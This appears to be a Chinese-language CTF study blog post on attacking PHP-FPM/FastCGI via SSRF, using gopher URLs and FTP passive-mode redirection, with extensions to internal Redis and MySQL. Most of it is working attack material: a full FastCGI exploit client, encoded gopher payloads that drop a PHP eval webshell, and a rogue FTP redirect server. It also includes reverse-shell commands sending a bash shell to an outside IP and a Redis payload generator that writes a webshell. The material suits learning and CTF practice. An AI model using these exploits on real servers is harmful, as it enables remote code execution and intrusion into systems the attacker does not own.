## 前言

这儿稍微总结下现在看到的一些对FPM和FastCGI的攻击方式

##  前置知识

### 什么是CGI?

>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。**简单理解，可以认为CGI就是用来帮助Web服务器和运行在其上的应用程序进行“交流”**

> 当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。

> 而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。 也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。

### 什么是FastCGI?

>FastCGI是一个可伸缩地、高速地在HTTP服务器和动态脚本语言间通信的接口（FastCGI接口在Linux下是socket（可以是文件socket，也可以是ip socket）），主要优点是把动态语言和HTTP服务器分离开来。多数流行的HTTP服务器都支持FastCGI，包括Apache、Nginx和lightpd。
>
>同时，FastCGI也被许多脚本语言所支持，比较流行的脚本语言之一为PHP。FastCGI接口方式采用C/S架构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程执行，然后将得到的结构返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。

###  web服务器，web中间件和web容器的区别

参考文献：https://blog.csdn.net/qq_36119192/article/details/84501439

###  浏览器处理网页的过程

#### 1.浏览器访问静态网页过程：

```
在整个网页的访问过程中，Web容器(例如Apache、Nginx)只担任着内容分发者的身份，当访问静态网站的
主页时，Web容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器

```

![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202271702111.png)

#### 2.浏览器访问动态页面

```
当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，web容器就会去找PHP解
析器来进行处理(这里以Apache为例)，它会把这个请求进行简单的处理，然后交给PHP解释器
```



![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202271702118.png)



```
当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI 程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHPWeb访问流程。
```

#### 总结 

对于php中，web访问顺序：

web浏览器------>web中间件(web服务器)------->php服务器----->数据库

下面是Nginx FastCGI的运行原理

![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202271702127.png)

##  FastCGI协议的分析

## PHP-FPM

##  FPM任意代码执行

##  FPM未授权访问

直接看p神的文章：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

没必要搬过来

##  SSRF直接对FPM/FastCGI的攻击

以CTFHUB上的ssrf题为例子，就是利用`gopher`协议打

###  方法一：

利用p神的脚本(利用`fcgi_exp 工具`)

我们在本机监听9000端口，然后运行`fpm.py`将恶意FastCGI协议报文数据打在本机的9000端口，保存为exp.txt

```
# 监听9000端口
nc -lvvp 9000 > exp.txt

# 运行`fpm.py`
python3 fpm.py 127.0.0.1 /var/www/html/index.php -c "<?php system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk 7Pz4 | base64 -d > /var/www/html/shel1.php');die('-----made by pniu----- ');?>"
```

然后构造gopher协议,二次编码

```python
from urllib import quote
with open('exp.txt') as f:
	pld = f.read()
 a="gopher://127.0.0.1:9000/_" + quote(pld)
print(urllib.parse.quote(a))

```

?url=传进去,连接蚁剑

python脚本

```
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    print(force_text(response))
```

### 方法二：

`gopherus工具`直接打fastcgi，我觉得这个方便点

ctfhub上的题

```
python gopherus.py --exploit fastcgi
/var/www/html/index.php                 //这里输入的是一个已知存在的php文件
echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d > /var/www/html/shell.php
```

这儿是urlencode一次编码

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH134%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%86%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%20%7C%20base64%20-d%20%3E%20/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

我们需要进行二次编码

```
gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520%2Fvar%2Fwww%2Fhtml%2Fshell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

然后我们可以用蚁剑连接，找根目录，就可以得到flag

## FTP的被动模式打FPM/FastCGI

### FTP的前置知识

#### FTP 协议

FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。FTP 协议包括两个组成部分，其一为 FTP 服务器，其二为 FTP 客户端。其中 FTP 服务器用来存储文件，用户可以使用 FTP 客户端通过 FTP 协议访问位于 FTP 服务器上的资源。在开发网站的时候，通常利用 FTP 协议把网页或程序传到 Web 服务器上。此外，由于 FTP 传输效率非常高，在网络上传输大的文件时，一般也采用该协议。

默认情况下 FTP 协议使用 TCP 端口中的 20 和 21 这两个端口，其中 20 用于传输数据，21 用于传输控制信息。但是，是否使用 20 作为传输数据的端口与 FTP 使用的传输模式有关，如果采用主动模式，那么数据传输端口就是 20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。

#### FTP 协议的工作方式

FTP 支持两种模式，一种方式叫做 Standard（也就是 PORT 方式，主动方式），一种是 Passive（也就是PASV，被动方式）。 Standard 模式 FTP 的客户端发送 PORT 命令到 FTP 服务器。Passive 模式 FTP 的客户端发送 PASV 命令到 FTP 服务器。

下面介绍一下这两种方式的工作原理：

**Port**

FTP 客户端首先和 FTP 服务器的 TCP 21 端口建立连接，通过这个通道发送控制命令。控制连接建立后，如果客户端需要接收数据，则在这个控制通道上发送 PORT 命令。 PORT 命令包含了客户端用什么端口接收数据（PORT 命令的格式比较特殊）。在传送数据的时候，服务器端通过自己的 TCP 20 端口连接至客户端用 PORT 命令指定的端口发送数据。 可见，FTP 服务器必须主动和客户端建立一个新的连接用来传送数据。

**Passive**

在建立控制通道的时候和 Standard 模式类似，都是 FTP 客户端和 FTP 服务器的 TCP 21 端口建立连接，但建立连接后发送的不是 PORT 命令，而是 PASV 命令。FTP 服务器收到 PASV 命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接到 FTP 服务器的此高端端口，通过三次握手建立通道，然后 FTP 服务器将通过这个端口进行数据的传送。

> 简单地说，主动模式和被动模式这两种模式是按照 FTP 服务器的 “角度” 来说的，更通俗一点说就是：在传输数据时，如果是服务器主动连接客户端，那就是主动模式；如果是客户端主动连接服务器，那就是被动模式。

可见，在被动方式中，FTP 客户端和服务端的数据传输端口是由服务端指定的，而且还有一点是很多地方没有提到的，实际上除了端口，服务器的地址也是可以被指定的。由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的：

```python
227 Entering Passive Mode(192,168,9,2,4,8)
```

227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 `(192,168,9,2,4,8)` 代表让客户端到连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口。

这样，假如我们指定 `(127,0,0,1,0,9000)` ，那么便可以将地址和端口指到 127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000 端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个重定向 Payload 的内容。



### 原理：

漏洞代码
```
<?php
$contents = file_get_contents($_GET['viewFile']);
file_put_contents($_GET['viewFile'], $contents);
```
这里读取路径viewFile，之后写回文件中。这看似什么都没有做。

这份代码可以用来攻击PHP-FPM

>如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。

现在如果我们使用viewFile=ftp://evil-server/file.txt那么会发生：
>
>首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。
>然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。

那此时，在它尝试使用file_put_contents()上传回去时，我们告诉它把文件发送到127.0.0.1:9001(fpm的端口，默认是9000)
那么，我们就在这中间造成了一次SSRF，攻击php-fpm

###  演示过程

当然下面三个是FTP攻击，之前学的是利用gopher协议，dict协议打。

### FTP打FPM

####  情况1

`对上面的代码，只有一个控制变量`

首先，我们使用gopherus工具生成攻击fastcgi的payload

```
python gopherus.py --exploit fastcgi
/var/www/html/index.php  # 这里输入的是目标主机上一个已知存在的php文件
bash -c "bash -i >& /dev/tcp/192.168.43.247/10000 0>&1"  # 这里输入的是要执行的命令
```

得到payload，而我们需要的是上面payload中 `_` 后面的数据部分，即

```
%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

然后写FTP服务代码，将上面的payload中的数据替换掉下面ftp脚本中的payload的内容

```python
# -*- coding: utf-8 -*-
# @Time    : 2021/1/13 6:56 下午
# @Author  : tntaxin
# @File    : ftp_redirect.py
# @Software:

import socket
from urllib.parse import unquote

# 对gopherus生成的payload进行一次urldecode
payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")

    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
    if count == 1:
        conn.send(b"213 3 \n")  
    else:
        conn.send(b"300 \n")

    print(conn.recv(20))  # EPSV\r\n'
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        conn.send(b"227 127,0,0,1,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1
```

在攻击机上运行上面的脚本，开启FTP服务（一定记得端口开放,cd到相应的目录）

![image-20210501222030292](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202271725369.png)

然后监听端口（与上面的payload端口一定要符合）

![image-20220227172724351](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202271727475.png)

传参，触发攻击

```
/ssrf.php?viewFile=ftp://aaa@192.168.43.247:23/123
```

就可以反弹shell了。

####  情况2

**有两个控制变量**

```php
<?php
file_put_contents($_GET['file'], $_GET['data']);
```

首先还是使用 gopherus 生成payload：

```
BASH
Copy successfullypython gopherus.py --exploit fastcgi
/var/www/html/index.php  # 这里输入的是目标主机上一个已知存在的php文件
bash -c "bash -i >& /dev/tcp/192.168.43.247/2333 0>&1"  # 这里输入的是要执行的命令
```

得到的payload只截取 `_` 后面的数据部分。

然后再攻击机上执行以下python脚本搭建一个恶意的 ftp 服务器：

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

运行脚本：`python3 ftp.py:`

然后传参：data的赋值为上面的payload的

```
/?file=ftp://aaa@192.168.43.247:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/10000%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

然后就反弹shell了

###  FTP打内网redis

假设内网中存在 Redis 并且可以未授权访问的话，我们也可以直接攻击 Redis，实现写入 Webshell、SSH 秘钥、计划任务等。

首先编写脚本生成攻击 Redis 的 Payload：

```python
import urllib.parse
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n<?php eval($_POST[\"cmd\"]);?>\n\n"
filename="1.php"
path="/var/www/html"
passwd=""        #如果无密码就不加，如果有密码就加
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(urllib.parse.quote(payload))


```

得到的 Payload 只选取 `_` 后面的部分

后面也就是攻击机搭建FTP服务，然后监听

被攻击机构造请求并发送payload

```
/?file=ftp://aaa@47.101.57.72:23/123&data=%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

就可以成功写入webshell了。

###  FTP打Mysql

假设内网中存在 MySQL 并且可以未授权访问的话，我们也可以直接攻击其 MySQL，具体操作有查询 MySQL 中的数据、写入 Webshell、UDF 提权执行系统命令等。

首先使用 [Gopherus](https://github.com/tarunkant/Gopherus) 生成 Payload：

```
python2 gopherus.py --exploit mysql
root    # 这里输入MySQL的用户名
system bash -c "bash -i >& /dev/tcp/47.101.57.72/2333 0>&1";  # 这里输入的是需要执行的MySQL语句或命令, 这里我们反弹shell
```

得到的 Payload 只选取 `_` 后面的

然后后面一样的。

## 加载恶意 .so 实现 RCE 绕过 disable_functions



上传代码

```
<?php
file_put_contents($_GET['file'], $_GET['data']);
```

#### 原理

通过`file_put_contents`上传文件到FTP服务器，FTP将`data内容`发送到PFM端口，从而实现加载so文件，而so文件中是恶意命令，从而实现恶意命令执行。其中data的内容是payload。在payload发送前需要先传so文件上去。

#### 演示过程

直接通过CTF题

参考：[蓝帽杯的 One Pointer PHP](http://42.193.170.176:8099/index.php/archives/7/)

原理：

>先利用数组溢出，看phpinfo，有open_basedir和disabled_functions。先写入文件，可以连接蚁剑，获取webshell，但是打不开文件目录。利用ini.set绕过open_basedir。但是文件内容看不到，没有权限，需要提权。但提权的前提是获得shell，需要反弹shell。就利用FTP打FPM,从而加载so文件，从而实现反弹shell，后面就是提权。
>
>

[[WMCTF2021]Make PHP Great Again And Again](https://blog.csdn.net/rfrder/article/details/120984108?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164595043616780261929486%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=164595043616780261929486&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120984108.nonecase&utm_term=wmctf&spm=1018.2226.3001.4450)

原理:

>同样是需要绕过disabled_functions,上面那个题是发现了redis的端口，这个题是发现了FPM的端口。然后还是先上传魔改的so文件，vpn上运行ftp服务。利用脚本生成一个恶意的FastCGI请求(payload)。再利用file_put_contents,将payload打过去，加载so文件，绕过disabled_functions，实现命令执行。

##  其他的CTF题

[[陇原战疫2021网络安全大赛]eaaasyphp](https://blog.csdn.net/unexpectedthing/article/details/123137693)

原理：

>先看到pop链找信息，利用phpinfo，发现了fastcgi，然后利用FTP的被动模式打fpm
>
>通过pop链写入文件，filename为本地搭建的FTP服务器，data直接就是gopherus工具生成的payload。FTP服务器会将文件内容传到FPM端口上，触发文件内容的代码执行，从而反弹shell，后面再提权。

[2022VNCTF](https://blog.csdn.net/unexpectedthing/article/details/123078631)

原理：

方法1：直接利用`pwn`绕过`disabled_functions`

